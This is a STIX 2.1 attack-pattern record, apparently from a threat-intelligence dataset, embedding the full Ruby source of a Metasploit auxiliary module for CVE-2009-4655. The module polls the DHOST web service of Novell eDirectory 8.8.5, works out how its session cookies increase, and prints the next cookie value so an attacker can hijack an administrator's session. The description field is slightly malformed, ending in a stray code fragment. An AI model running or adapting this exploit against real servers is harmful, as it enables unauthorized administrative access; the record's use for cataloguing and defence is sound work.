{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--99ff9a71-8ef8-4069-9178-9d238fdfef73",
    "created": "2024-08-14T16:22:46.615746Z",
    "modified": "2024-08-14T16:22:46.61575Z",
    "name": "Novell eDirectory DHOST Predictable Session Cookie",
    "description": " This module is able to predict the next session cookie value issued by the DHOST web service of Novell eDirectory 8.8.5. An attacker can run this module, wait until the real administrator logs in, then specify the predicted cookie value to hijack their session.  'References'     => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/edirectory/edirectory_dhost_cookie.rb",
            "external_id": "edirectory_dhost_cookie.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Novell eDirectory DHOST Predictable Session Cookie',\n      'Description'    => %q{\n        This module is able to predict the next session cookie value issued\n      by the DHOST web service of Novell eDirectory 8.8.5. An attacker can run\n      this module, wait until the real administrator logs in, then specify the\n      predicted cookie value to hijack their session.\n      },\n      'References'     =>\n        [\n          ['CVE', '2009-4655'],\n          ['OSVDB', '60035']\n        ],\n      'Author'         => 'hdm',\n      'License'        => MSF_LICENSE\n    ))\n\n    register_options([\n      Opt::RPORT(8030),\n      OptBool.new('SSL', [true, 'Use SSL', true])\n    ])\n  end\n\n  def run\n    vals = []\n    name = \"\"\n\n    print_status(\"Making 5 requests to verify predictions...\")\n    1.upto(6) do\n\n      connect\n      req =  \"GET /dhost/ HTTP/1.1\\r\\n\"\n      req << \"Host: #{rhost}:#{rport}\\r\\n\"\n      req << \"Connection: close\\r\\n\\r\\n\"\n      sock.put(req)\n      res = sock.get_once(-1,5)\n      disconnect\n\n      cookie = nil\n      if(res and res =~ /Cookie:\\s*([^\\s]+)\\s*/mi)\n        cookie = $1\n        cookie,junk = cookie.split(';')\n        name,cookie = cookie.split('=')\n        cookie      = cookie.to_i(16)\n        vals << cookie\n      end\n    end\n\n    deltas   = []\n    prev_val = nil\n    vals.each_index do |i|\n      if(i > 0)\n        delta = vals[i] - prev_val\n        print_status(\"Cookie: #{i} #{\"%.8x\" % vals[i]} DELTA #{\"%.8x\" % delta}\")\n        deltas << delta\n      end\n      prev_val = vals[i]\n    end\n\n    deltas.uniq!\n    if(deltas.length < 4)\n      print_status(\"The next cookie value will be: #{name}=#{\"%.8x\" % (prev_val + deltas[0])}\")\n    else\n      print_status(\"The cookie value is less predictable, maybe this has been patched?\")\n      print_status(\"Deltas: #{deltas.map{|x| \"%.8x\" % x}.join(\", \")}\")\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        "hdm",
        ""
    ]
}